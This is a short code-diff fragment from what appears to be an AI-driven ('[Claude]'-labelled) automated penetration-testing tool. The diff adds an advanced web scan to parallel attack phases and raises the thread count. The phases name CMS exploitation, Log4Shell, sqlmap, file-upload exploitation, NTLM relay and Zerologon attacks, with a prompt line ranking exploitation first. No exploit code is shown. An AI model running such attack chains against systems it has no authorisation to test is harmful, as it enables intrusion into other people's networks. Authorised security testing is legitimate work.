+            self._log(f"[Claude] Fase 4w [parallel]: Web fuzzing + CMS + Log4Shell + SQLmap + Upload + Subdomains + AdvWeb")
             self._web_fuzz(target, open_ports, accumulated_output)
             self._cms_exploit(target, open_ports, accumulated_output)
             self._log4shell_scan(target, open_ports, accumulated_output)
             self._sqlmap_auto(target, open_ports, accumulated_output)
             self._file_upload_exploit(target, open_ports, accumulated_output)
             self._subdomain_vhost_enum(target, open_ports, accumulated_output)
+            self._advanced_web_scan(target, open_ports, accumulated_output)
 
         def _phase4n():
             self._log(f"[Claude] Fase 4n [parallel]: Network attacks — NTLM relay, Zerologon, AD enum")
@@ -9668,8 +10589,8 @@ PRIORITIES: exploit confirmed vulns > enumerate unknown services > brute-force c
             self._zerologon_attack(target, open_ports, accumulated_output)
             self._advanced_service_enum(target, open_ports, accumulated_output)
 
-        self._log(f"[Claude] Iniciando Fases 3+4+4w+4n en paralelo (4 threads)")
-        with _cf.ThreadPoolExecutor(max_workers=4, thread_name_prefix="pentest") as executor:
+        self._log(f"[Claude] Iniciando Fases 3+4+4w+4n en paralelo (5 threads)")
+        with _cf.ThreadPoolExecutor(max_workers=5, thread_name_prefix="pentest") as executor:
             f3 = executor.submit(_phase3)
             f4 = executor.submit(_phase4)
             f4w = executor.submit(_phase4w)
